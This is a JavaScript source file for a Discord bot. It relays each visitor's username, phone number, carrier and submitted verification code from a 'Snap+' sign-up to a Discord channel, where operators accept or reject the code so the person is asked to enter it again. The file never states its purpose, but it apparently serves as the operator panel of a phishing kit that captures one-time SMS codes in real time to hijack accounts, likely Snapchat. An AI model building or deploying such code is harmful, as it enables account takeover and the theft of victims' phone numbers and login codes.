const {
    Client,
    GatewayIntentBits,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder
} = require('discord.js');

const { users } = require('./store');

const client = new Client({
    intents: [GatewayIntentBits.Guilds]
});

client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, username] = interaction.customId.split(':');
    const user = users[username];

    if (!user) {
        return interaction.reply({
            content: 'Utilisateur introuvable.',
            ephemeral: true
        });
    }

    if (action === 'accept') {
        user.status = 'verified';

        const embed = new EmbedBuilder()
            .setTitle('✅ Code validé')
            .setFields(
                { name: '👤 Nom d’utilisateur', value: username, inline: false },
                { name: '📞 Téléphone', value: formatPhoneNumber(user.phone), inline: false },
                { name: '🔢 Code', value: `\`${user.submittedCode}\``, inline: false },
                { name: '📅 Validé à', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
            )
            .setFooter({ text: 'Utilisateur vérifié' })
            .setTimestamp();

        await interaction.update({
            content: '@everyone',
            embeds: [embed],
            components: []
        });
    }

    if (action === 'reject') {
        user.status = 'rejected';
        const rejectedCode = user.submittedCode;
        user.submittedCode = null;

        const embed = new EmbedBuilder()
            .setTitle('🔒 Code rejeté')
            .setFields(
                { name: '👤 Nom d’utilisateur', value: username, inline: false },
                { name: '🔢 Code saisi', value: `\`${rejectedCode || 'N/A'}\``, inline: false },
                { name: '📞 Téléphone', value: formatPhoneNumber(user.phone), inline: false },
                { name: '📅 Rejeté à', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
            )
            .setFooter({ text: 'L’utilisateur devra ressaisir le code' })
            .setTimestamp();

        await interaction.update({
            content: '@everyone',
            embeds: [embed],
            components: []
        });
    }
});

function formatPhoneNumber(phone) {
    if ((phone.startsWith('06') || phone.startsWith('07')) && phone.length === 10) {
        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    }

    if ((phone.startsWith('6') || phone.startsWith('7')) && phone.length === 9) {
        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{3})/, '$1 $2 $3 $4');
    }

    return phone;
}

async function sendInitialEmbed(username, phone) {
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
    const user = users[username];

    const embed = new EmbedBuilder()
        .setTitle('📱 Nouvelle inscription Snap+')
        .setFields(
            { name: '👤 Nom d’utilisateur', value: username, inline: false },
            { name: '📞 Téléphone', value: formatPhoneNumber(phone), inline: false },
            { name: '📡 Opérateur', value: user.operator || 'N/A', inline: false },
            { name: '📅 Date', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
        )
        .setFooter({ text: 'En attente du code…' })
        .setTimestamp();

    await channel.send({
        content: '@everyone',
        embeds: [embed]
    });
}

async function sendCodeEmbed(username) {
    const user = users[username];
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);

    const embed = new EmbedBuilder()
        .setTitle('🔒 Code de vérification soumis')
        .setFields(
            { name: '👤 Nom d’utilisateur', value: username, inline: false },
            { name: '🔢 Code saisi', value: `\`${user.submittedCode}\``, inline: false },
            { name: '📞 Téléphone', value: formatPhoneNumber(user.phone), inline: false },
            { name: '📅 Soumis à', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
        )
        .setFooter({ text: 'En attente de validation par un modérateur' })
        .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId(`accept:${username}`)
            .setLabel('Accepter')
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId(`reject:${username}`)
            .setLabel('Refuser')
            .setStyle(ButtonStyle.Danger)
    );

    await channel.send({
        content: '@everyone',
        embeds: [embed],
        components: [row]
    });
}

client.login(process.env.BOT_TOKEN);

module.exports = {
    sendInitialEmbed,
    sendCodeEmbed
};
